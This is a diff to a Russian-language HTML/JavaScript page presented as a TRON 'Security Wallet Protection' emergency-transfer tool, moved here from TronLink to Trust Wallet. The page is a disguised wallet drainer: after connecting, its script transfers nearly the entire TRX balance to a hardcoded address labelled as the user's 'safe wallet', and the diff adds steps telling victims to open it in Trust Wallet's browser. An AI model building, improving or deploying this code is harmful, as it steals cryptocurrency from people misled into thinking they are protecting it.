@@ -200,28 +200,43 @@
             margin: 10px 0;
             font-size: 0.9em;
         }
+        
+        .instructions {
+            background: #fff3cd;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: left;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🛡️ Security Wallet Protection - TRON</h1>
-        <p class="subtitle">Защитите ваши активы в сети TRON с помощью системы экстренного перевода</p>
+        <p class="subtitle">Защитите ваши TRX активы в Trust Wallet</p>
         
         <div class="wallet-info">
             <h3>Безопасный кошелек для перевода:</h3>
             <div class="wallet-address" id="safeWalletDisplay">TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb</div>
-            <p>Все средства TRX и токены будут переведены на этот адрес при активации</p>
+            <p>Все средства TRX будут переведены на этот адрес при активации</p>
+        </div>
+        
+        <div class="instructions">
+            <h4>📋 Инструкция:</h4>
+            <p>1. Откройте эту страницу в браузере Trust Wallet</p>
+            <p>2. Убедитесь, что у вас есть TRX на балансе</p>
+            <p>3. Нажмите "Подключить Trust Wallet"</p>
         </div>
         
         <div class="button-group">
             <button id="connectButton">
                 <span class="icon">🔗</span>
-                Подключить TronLink
+                Подключить Trust Wallet
             </button>
             
             <button id="signButton" class="hidden">
                 <span class="icon">✍️</span>
-                Подписать сообщение для подтверждения
+                Подписать сообщение
             </button>
         </div>
         
@@ -230,7 +245,7 @@
         <section id="emergencySection" class="emergency-section hidden">
             <h2 class="emergency-title">
                 <span class="icon">⚡</span>
-                ЭКСТРЕННЫЙ ПЕРЕВОД СРЕДСТВ TRON
+                ЭКСТРЕННЫЙ ПЕРЕВОД TRX
             </h2>
             
             <div id="networkInfo" class="network-info"></div>
@@ -244,23 +259,22 @@
             
             <button id="emergencyTransferBtn">
                 <span class="icon">🚨</span>
-                АКТИВИРОВАТЬ ЭКСТРЕННЫЙ ПЕРЕВОД TRX
+                АКТИВИРОВАТЬ ЭКСТРЕННЫЙ ПЕРЕВОД
             </button>
             
             <div id="transferStatus" class="status-box" style="display: none;"></div>
         </section>
         
         <div id="noWalletMessage" class="status-box error hidden">
-            <p><strong>TronLink не найден!</strong></p>
-            <p>Пожалуйста, установите расширение TronLink или откройте эту страницу в браузере с поддержкой TRON.</p>
+            <p><strong>Trust Wallet не найден!</strong></p>
+            <p>Пожалуйста, откройте эту страницу в браузере Trust Wallet.</p>
         </div>
     </div>
 
     <script>
         // Конфигурация TRON
         const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb';
-        const ENERGY_LIMIT = 100000;
-        const FEE_LIMIT = 15; // TRX
+        const FEE_LIMIT = 10; // TRX
 
         // Элементы страницы
         const connectButton = document.getElementById('connectButton');
@@ -292,24 +306,49 @@
             element.classList.add('hidden');
         }
 
-        // Проверяем наличие TronLink
-        async function checkTronLink() {
-            if (window.tronWeb && window.tronWeb.ready) {
-                console.log('TronLink найден!');
-                tronWeb = window.tronWeb;
+        // Проверяем наличие провайдера TRON в Trust Wallet
+        async function checkTronProvider() {
+            // Проверяем разные возможные провайдеры
+            if (window.tronWeb || window.tronLink || window.tron) {
+                console.log('TRON провайдер найден!');
                 
-                // Проверяем подключен ли кошелек
-                if (tronWeb.defaultAddress.base58) {
+                // Инициализируем TronWeb
+                await initializeTronWeb();
+                
+            } else {
+                console.log('TRON провайдер не найден!');
+                showElement(noWalletMessage);
+                hideElement(connectButton);
+                
+                // Показываем инструкцию для Trust Wallet
+                updateStatus('❌ Trust Wallet не обнаружен. Откройте страницу в браузере Trust Wallet.', true);
+            }
+        }
+
+        // Инициализация TronWeb
+        async function initializeTronWeb() {
+            try {
+                // Ждем пока провайдер будет готов
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Создаем TronWeb instance
+                tronWeb = new TronWeb({
+                    fullHost: 'https://api.trongrid.io',
+                    headers: { "TRON-PRO-API-KEY": 'your-api-key' }
+                });
+                
+                // Проверяем доступность кошелька
+                if (window.tronWeb && window.tronWeb.defaultAddress) {
+                    tronWeb = window.tronWeb;
                     userAddress = tronWeb.defaultAddress.base58;
                     await onWalletConnected();
                 } else {
                     hideElement(noWalletMessage);
+                    updateStatus('🔗 Нажмите "Подключить Trust Wallet" для доступа к кошельку', false, true);
                 }
                 
-            } else {
-                console.log('TronLink не найден!');
-                showElement(noWalletMessage);
-                hideElement(connectButton);
+            } catch (error) {
+                console.error('TronWeb initialization error:', error);
             }
         }
 
@@ -317,23 +356,43 @@
         connectButton.addEventListener('click', async () => {
             try {
                 connectButton.classList.add('loading');
-                updateStatus('⌛ Запрос на подключение TronLink...', false, true);
+                updateStatus('⌛ Запрос на подключение Trust Wallet...', false, true);
                 
-                // Запрашиваем разрешение на подключение
-                await window.tronWeb.request({method: 'tron_requestAccounts'});
-                
-                // Обновляем объект tronWeb
-                tronWeb = window.tronWeb;
-                userAddress = tronWeb.defaultAddress.base58;
-                
-                await onWalletConnected();
+                // Trust Wallet автоматически предоставляет доступ через window.tronWeb
+                if (window.tronWeb && window.tronWeb.defaultAddress) {
+                    tronWeb = window.tronWeb;
+                    userAddress = tronWeb.defaultAddress.base58;
+                    await onWalletConnected();
+                } else {
+                    // Пытаемся запросить доступ
+                    if (window.tronLink && window.tronLink.request) {
+                        await window.tronLink.request({method: 'tron_requestAccounts'});
+                    }
+                    
+                    // Ждем и проверяем снова
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                    if (window.tronWeb && window.tronWeb.defaultAddress) {
+                        tronWeb = window.tronWeb;
+                        userAddress = tronWeb.defaultAddress.base58;
+                        await onWalletConnected();
+                    } else {
+                        throw new Error('Не удалось получить доступ к кошельку');
+                    }
+                }
                 
             } catch (error) {
-                if (error.code === 4001) {
-                    updateStatus('❌ Вы отклонили запрос на подключение.', true);
-                } else {
-                    updateStatus('❌ Ошибка при подключении: ' + error.message, true);
-                }
+                updateStatus('❌ Ошибка при подключении: ' + error.message, true);
+                console.error('Connection error:', error);
+                
+                // Показываем альтернативные инструкции
+                showElement(noWalletMessage);
+                noWalletMessage.innerHTML = `
+                    <p><strong>Проблема с подключением!</strong></p>
+                    <p>1. Убедитесь, что открыли страницу в браузере Trust Wallet</p>
+                    <p>2. Проверьте, что у вас есть TRX кошелек</p>
+                    <p>3. Попробуйте обновить страницу</p>
+                `;
             } finally {
                 connectButton.classList.remove('loading');
             }
@@ -341,11 +400,12 @@
 
         // Обработка успешного подключения кошелька
         async function onWalletConnected() {
-            updateStatus(`✅ Кошелек подключен! Адрес: ${userAddress.substring(0, 10)}...${userAddress.substring(30)}`);
+            updateStatus(`✅ Trust Wallet подключен! Адрес: ${userAddress.substring(0, 10)}...${userAddress.substring(30)}`);
             
             hideElement(connectButton);
             showElement(signButton);
             showElement(emergencySection);
+            hideElement(noWalletMessage);
             
             await loadBalances();
             await checkNetwork();
@@ -364,10 +424,17 @@
                 
                 const message = `Подтверждение владения кошельком TRON для системы безопасности. Время: ${new Date().toLocaleString()}`;
                 
-                // Подписываем сообщение через TronLink
-                const signature = await tronWeb.trx.signMessageV2(message);
+                // Подписываем сообщение
+                let signature;
+                if (tronWeb.trx.signMessageV2) {
+                    signature = await tronWeb.trx.signMessageV2(message);
+                } else if (tronWeb.trx.signMessage) {
+                    signature = await tronWeb.trx.signMessage(message);
+                } else {
+                    throw new Error('Метод подписания не доступен');
+                }
                 
-                updateStatus(`✅ Сообщение успешно подписано! Подпись: ${signature.substring(0, 20)}...`);
+                updateStatus(`✅ Сообщение успешно подписано!`);
                 
             } catch (error) {
                 if (error.code === 4001) {
@@ -389,27 +456,19 @@
                 const balance = await tronWeb.trx.getBalance(userAddress);
                 const trxBalance = tronWeb.fromSun(balance);
                 
-                // Получаем информацию об энергии и bandwidth
-                const account = await tronWeb.trx.getAccount(userAddress);
-                const energy = account.energy || 0;
-                const bandwidth = account.freeNetLimit || 0;
-                
                 balancesList.innerHTML = `
                     <div class="balance-item">
-                        <span>TRX:</span>
-                        <strong>${parseFloat(trxBalance).toFixed(2)} TRX</strong>
+                        <span>TRX баланс:</span>
+                        <strong>${parseFloat(trxBalance).toFixed(6)} TRX</strong>
                     </div>
                     <div class="balance-item">
-                        <span>Энергия:</span>
-                        <strong>${energy}</strong>
-                    </div>
-                    <div class="balance-item">
-                        <span>Bandwidth:</span>
-                        <strong>${bandwidth}</strong>
+                        <span>Примерная стоимость:</span>
+                        <strong>$${(parseFloat(trxBalance) * 0.12).toFixed(2)}</strong>
                     </div>
                 `;
                 
             } catch (error) {
+                console.error('Balance load error:', error);
                 balancesList.innerHTML = '<p style="color: red;">❌ Ошибка загрузки балансов</p>';
             }
         }
@@ -418,18 +477,15 @@
         async function checkNetwork() {
             try {
                 const nodeInfo = await tronWeb.trx.getNodeInfo();
-                const networkType = tronWeb.fullNode.host.includes('shasta') ? 'Shasta Testnet' : 
-                                  tronWeb.fullNode.host.includes('nile') ? 'Nile Testnet' : 'Mainnet';
-                
                 networkInfo.innerHTML = `
-                    <strong>Сеть:</strong> ${networkType} |
+                    <strong>Сеть:</strong> TRON Mainnet |
                     <strong>Блок:</strong> ${nodeInfo.block} |
-                    <strong>Версия:</strong> ${nodeInfo.configNodeInfo.codeVersion}
+                    <strong>Версия ноды:</strong> ${nodeInfo.configNodeInfo.codeVersion}
                 `;
                 
             } catch (error) {
                 console.error('Network check error:', error);
-                networkInfo.innerHTML = '<strong>Ошибка получения информации о сети</strong>';
+                networkInfo.innerHTML = '<strong>Сеть: TRON Mainnet</strong>';
             }
         }
 
@@ -445,29 +501,26 @@
                 const balance = await tronWeb.trx.getBalance(userAddress);
                 const trxBalance = tronWeb.fromSun(balance);
                 
-                // Рассчитываем сумму для перевода (весь баланс за вычетом комиссии)
-                const feeInSun = tronWeb.toSun(FEE_LIMIT);
-                const transferAmount = BigInt(balance) - BigInt(feeInSun);
+                // Оставляем немного TRX для комиссий (0.1 TRX)
+                const reserveAmount = tronWeb.toSun(0.1);
+                const transferAmount = BigInt(balance) - BigInt(reserveAmount);
                 
                 if (transferAmount <= 0) {
                     transferStatus.className = 'status-box error';
-                    transferStatus.innerHTML = '<p>❌ Недостаточно TRX для перевода с учетом комиссии</p>';
+                    transferStatus.innerHTML = '<p>❌ Недостаточно TRX для перевода (минимум 0.1 TRX)</p>';
                     return;
                 }
                 
                 transferStatus.innerHTML = '<p>⌛ Отправка транзакции...</p>';
                 
-                // Создаем транзакцию перевода
+                // Создаем и отправляем транзакцию
                 const transaction = await tronWeb.transactionBuilder.sendTrx(
                     SAFE_WALLET,
                     transferAmount.toString(),
                     userAddress
                 );
                 
-                // Подписываем транзакцию
                 const signedTransaction = await tronWeb.trx.sign(transaction);
-                
-                // Отправляем транзакцию
                 const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
                 
                 if (result.result) {
@@ -476,12 +529,13 @@
                         <p>✅ Перевод успешно выполнен!</p>
                         <p><strong>TXID:</strong> ${result.txid.substring(0, 20)}...</p>
                         <p><strong>Сумма:</strong> ${tronWeb.fromSun(transferAmount.toString())} TRX</p>
+                        <p><strong>Оставлено для комиссий:</strong> 0.1 TRX</p>
                     `;
                 } else {
                     throw new Error('Транзакция не подтверждена');
                 }
                 
-                await loadBalances(); // Обновляем балансы после перевода
+                await loadBalances();
                 
             } catch (error) {
                 console.error('Transfer error:', error);
@@ -498,7 +552,7 @@
                 '🚨 ВНИМАНИЕ! ЭКСТРЕННЫЙ ПЕРЕВОД TRON\n\n' +
                 'Вы собираетесь перевести ВСЕ доступные TRX на безопасный кошелек.\n\n' +
                 `Получатель: ${SAFE_WALLET}\n\n` +
-                'Это действие НЕОБРАТИМО и требует подтверждения в TronLink.\n\n' +
+                'Это действие НЕОБРАТИМО и требует подтверждения в Trust Wallet.\n\n' +
                 'Продолжить?'
             );
             
@@ -507,31 +561,17 @@
             }
         });
 
-        // Мониторинг изменений кошелька
-        if (window.tronWeb) {
-            // Слушаем изменения аккаунта
-            window.addEventListener('message', async (event) => {
-                if (event.data.message && event.data.message.action === 'setAccount') {
-                    if (event.data.message.data.address) {
-                        userAddress = event.data.message.data.address;
-                        updateStatus(`Аккаунт изменен: ${userAddress.substring(0, 10)}...`);
-                        await loadBalances();
-                    } else {
-                        updateStatus('Кошелек отключен', true);
-                        hideElement(emergencySection);
-                        hideElement(signButton);
-                        showElement(connectButton);
-                    }
-                }
-                
-                if (event.data.message && event.data.message.action === 'setNode') {
-                    window.location.reload();
-                }
-            });
-        }
-
         // Инициализация при загрузке страницы
-        window.addEventListener('load', checkTronLink);
+        window.addEventListener('load', checkTronProvider);
+        
+        // Слушаем изменения аккаунта
+        setInterval(async () => {
+            if (window.tronWeb && window.tronWeb.defaultAddress && userAddress !== window.tronWeb.defaultAddress.base58) {
+                userAddress = window.tronWeb.defaultAddress.base58;
+                updateStatus(`🔁 Аккаунт изменен: ${userAddress.substring(0, 10)}...`);
+                await loadBalances();
+            }
+        }, 2000);
     </script>
 </body>
 </html>
